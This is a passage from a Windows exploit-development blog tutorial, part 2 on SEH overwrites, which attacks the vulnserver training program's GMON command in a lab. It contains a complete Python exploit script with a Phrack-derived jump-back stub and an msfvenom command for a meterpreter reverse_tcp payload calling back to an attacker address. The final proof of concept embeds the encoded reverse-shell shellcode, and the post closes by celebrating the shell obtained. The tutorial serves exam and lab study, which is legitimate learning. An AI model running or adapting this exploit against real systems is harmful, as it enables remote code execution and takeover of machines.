<p>Note: We can use an Egghunter which is a better option. However, I won&rsquo;t be going over that in this tutorial, maybe the next :)</p>
<p>A small trick to jump up and down our buffer can be found in the Phrack #62 Article 7 Originally written by Aaron Adams.</p>
<p>Let&rsquo;s take a look at this shellcode.</p>
<p>This shellcode uses an interesting method of floating-point calculations, to identify the location of <code>EIP</code> and copy it into <code>ECX</code>. Once that location is in <code>ECX</code>, we can increase or decrease <code>ECX</code> by as much as we need to gain extra space for our shellcode. In this example, we will be jumping back 512 bytes.</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">############################################################
# 1st stage shellcode:
############################################################
# [BITS 32]
#
# global _start
#
# _start:
#
# ;--- Taken from Phrack #62 Article 7 Originally written by Aaron Adams
#
# ;--- copy eip into ecx
# fldz
# fnstenv [esp-12]
# pop ecx
# add cl, 10
# nop
# ;----------------------------------------------------------------------
# dec ch ; ecx=-256;
# dec ch ; ecx=-256;
# jmp ecx ; lets jmp ecx (current location - 512)
</code></pre><p><strong>Credits to (<a href="http://phrack.org/issues/62/7.html">Phrack</a>)</strong></p>
<p>We compile this code with NASM, and look at the resulting binary code:</p>
<pre tabindex="0"><code>D9EED97424F45980C10A90FECDFECDFFE1 
</code></pre><p>Lets put this code in our exploit. I will replace some of the A&rsquo;s with memN0ps :p. So we can slide into our 2nd stage payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#625010B4 \xB4\x10\x50\x62</span>
</span></span><span class="line"><span class="cl"><span class="n">SEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xB4\x10\x50\x62</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#JMP SHORT \xEB\xD0\x90\x90</span>
</span></span><span class="line"><span class="cl"><span class="n">nSEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xEB\xD0\x90\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#D9EED97424F45980C10A90FECDFECDFFE1</span>
</span></span><span class="line"><span class="cl"><span class="n">jumpback</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#\x90</span>
</span></span><span class="line"><span class="cl"><span class="n">memn0ps</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3518</span> <span class="o">-</span> <span class="mi">50</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">jumpback</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">memn0ps</span> <span class="o">*</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">jumpback</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">nSEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5012</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>After running the exploit, we can see our <code>JMP SHORT</code> and <code>jmpback</code> shellcode.</p>
<p>The <code>JMP SHORT</code> takes us to <code>0176FF96</code>. Let&rsquo;s keep pressing <code>F7</code> to step into the code, after <code>JMP ECX</code> we are redirected to the address <code>0176FDBD</code>, following that in dump we can see that we have plenty of space to place our shellcode for a reverse shell.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Space.png" alt=""></p>
<p>Now, let&rsquo;s take the jump, press F7. We have around 501 bytes of free space for our reverse shell, which is more than enough.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Debugger_Space.png" alt=""></p>
<h2 id="generating-shellcode-with-metasploit">Generating Shellcode with Metasploit</h2>
<pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.128 LPORT=443 -b &#34;\x00&#34; x86/shikata_ga_nai EXITFUN=thread -f c
</code></pre><p>EXITFUNC parameter is so that you can have a clean exit from the target box and shikata_ga_nai is the encoder.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/msfvenom.png" alt=""></p>
<h1 id="final-poc">Final PoC</h1>
<p>The final is below.</p>
<p>We can add NOP&rsquo;s to safely slide into our shellcode, make sure the math is correct, whatever you add the buffer you must take away from the appropriate location. An off by 1 error can throw you off for hours, trust me, speaking with the experience of looking at the screen for days.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\xd9\xf6\xbb\x44\x79\xc8\x11\xd9\x74\x24\xf4\x58\x29\xc9\xb1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x56\x83\xc0\x04\x31\x58\x14\x03\x58\x50\x9b\x3d\xed\xb0\xd9</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xbe\x0e\x40\xbe\x37\xeb\x71\xfe\x2c\x7f\x21\xce\x27\x2d\xcd</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xa5\x6a\xc6\x46\xcb\xa2\xe9\xef\x66\x95\xc4\xf0\xdb\xe5\x47</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x72\x26\x3a\xa8\x4b\xe9\x4f\xa9\x8c\x14\xbd\xfb\x45\x52\x10</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xec\xe2\x2e\xa9\x87\xb8\xbf\xa9\x74\x08\xc1\x98\x2a\x03\x98</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x3a\xcc\xc0\x90\x72\xd6\x05\x9c\xcd\x6d\xfd\x6a\xcc\xa7\xcc</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x93\x63\x86\xe1\x61\x7d\xce\xc5\x99\x08\x26\x36\x27\x0b\xfd</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x45\xf3\x9e\xe6\xed\x70\x38\xc3\x0c\x54\xdf\x80\x02\x11\xab</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xcf\x06\xa4\x78\x64\x32\x2d\x7f\xab\xb3\x75\xa4\x6f\x98\x2e</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xc5\x36\x44\x80\xfa\x29\x27\x7d\x5f\x21\xc5\x6a\xd2\x68\x81</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x5f\xdf\x92\x51\xc8\x68\xe0\x63\x57\xc3\x6e\xcf\x10\xcd\x69</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x46\x36\xee\xa6\xe0\x57\x10\x47\x10\x71\xd7\x13\x40\xe9\xfe</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x1b\x0b\xe9\xff\xc9\xa1\xe3\x97\x31\x9d\xa5\xe7\xda\xdf\x45</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xe9\xa1\x56\xa3\xb9\x85\x38\x7c\x7a\x76\xf8\x2c\x12\x9c\xf7</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x13\x02\x9f\xd2\x3b\xa9\x70\x8a\x14\x46\xe8\x97\xef\xf7\xf5</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x02\x8a\x38\x7d\xa6\x6a\xf6\x76\xc3\x78\xef\xe0\x2b\x81\xf0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x84\x2b\xeb\xf4\x0e\x7c\x83\xf6\x77\x4a\x0c\x08\x52\xc9\x4b</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xf6\x23\xfb\x20\xc1\xb1\x43\x5f\x2e\x56\x43\x9f\x78\x3c\x43</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xf7\xdc\x64\x10\xe2\x22\xb1\x05\xbf\xb6\x3a\x7f\x13\x10\x53</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x7d\x4a\x56\xfc\x7e\xb9\xe4\xfb\x80\x3f\xc3\xa3\xe8\xbf\x53</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x54\xe8\xd5\x53\x04\x80\x22\x7b\xab\x60\xca\x56\xe4\xe8\x41</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x37\x46\x89\x56\x12\x06\x17\x56\x91\x93\xa8\x2d\xda\x24\x49</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xd2\xf2\x40\x4a\xd2\xfa\x76\x77\x04\xc3\x0c\xb6\x94\x70\x1e</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x8d\xb9\xd1\xb5\xed\xee\x22\x9c</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#625010B4 \xB4\x10\x50\x62</span>
</span></span><span class="line"><span class="cl"><span class="n">SEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xB4\x10\x50\x62</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#JMP SHORT \xEB\xD0\x90\x90</span>
</span></span><span class="line"><span class="cl"><span class="n">nSEH</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xEB\xD0\x90\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#D9EED97424F45980C10A90FECDFECDFFE1</span>
</span></span><span class="line"><span class="cl"><span class="n">jumpback</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#\x90</span>
</span></span><span class="line"><span class="cl"><span class="n">memn0ps</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3518</span> <span class="o">-</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">50</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">jumpback</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">memn0ps</span> <span class="o">*</span> <span class="mi">100</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">memn0ps</span> <span class="o">*</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">jumpback</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">nSEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5012</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Quickly looking at the shellcode, we can see that it will be executed safely.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/debugger_shellcode.png" alt=""></p>
<p>Let&rsquo;s step up a handler and hit the play button.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/handler.png" alt=""></p>
<p>W00TW00T! We have a reverse shell :)</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/W00TW00T.png" alt=""></p>
<p>Please note that there are many better blogs out there that explain these things better than I do; all you have to do is search.</p>
<p>This is not only for you but for me as well as it is easy to forget these things while you are not using them every day of your life. This blog will help me understand the concept better as well as improve my explanations.</p>
<p>I did this like 2 years ago while doing OSCE and didn&rsquo;t get time to contribute to the community back then.</p>
<p>I hope you enjoyed it. Hopefully, I will write more when I have the time. :)</p>
<p>#HackThePlanet</p>
<h2 id="coming-next">Coming Next</h2>
<ul>
<li>Egghunter</li>
<li>ASLR</li>
<li>DEP</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.securitysift.com/">https://www.securitysift.com/</a></li>
<li><a href="https://www.fuzzysecurity.com/tutorials.html">https://www.fuzzysecurity.com/tutorials.html</a></li>
<li><a href="https://www.corelan.be/">https://www.corelan.be/</a></li>
<li><a href="https://h0mbre.github.io/">https://h0mbre.github.io/</a></li>
<li><a href="http://sh3llc0d3r.com/">http://sh3llc0d3r.com/</a></li>
<li><a href="https://www.offensive-security.com/">https://www.offensive-security.com/</a></li>
<li><a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver</a></li>
<li><a href="http://www.thegreycorner.com/p/vulnserver.html">http://www.thegreycorner.com/p/vulnserver.html</a></li>
</ul>


        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Part-1/" data-toggle="tooltip" data-placement="top" title="Windows User Mode Exploit Development: Part 1">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Egghunter-Part-3/" data-toggle="tooltip" data-placement="top" title="Windows User Mode Exploit Development: Egghunter Part 3">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                <a href="https://github.com/memN0ps" title="GitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://twitter.com/memN0ps" title="Twitter">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            <a href="" title="RSS">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              memN0ps
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2022
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://memn0ps.github.io/">memN0ps</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.93.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<script src="https://memn0ps.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://memn0ps.github.io/js/load-photoswipe.js"></script>









    
  </body>
</html>

